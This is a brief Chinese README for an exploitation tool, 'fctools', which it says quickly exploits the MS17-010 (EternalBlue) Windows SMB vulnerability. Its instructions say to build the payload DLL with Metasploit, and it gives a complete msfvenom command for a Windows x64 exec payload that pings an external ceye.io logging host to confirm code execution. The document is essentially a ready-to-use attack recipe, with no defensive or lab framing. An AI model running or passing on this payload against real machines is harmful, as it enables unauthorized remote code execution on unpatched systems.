## fctools
一款MS17-010漏洞快速利用软件
## 使用说明
使用msf生成dll，修改名称为x64.dll或者x86.dll
## 生成方法
···
msfvenom -p windows/x64/exec CMD="ping vxqxor.ceye.io" EXITFUNC=process -f dll > /Users/Nibeshe/Desktop/x64.dll
···
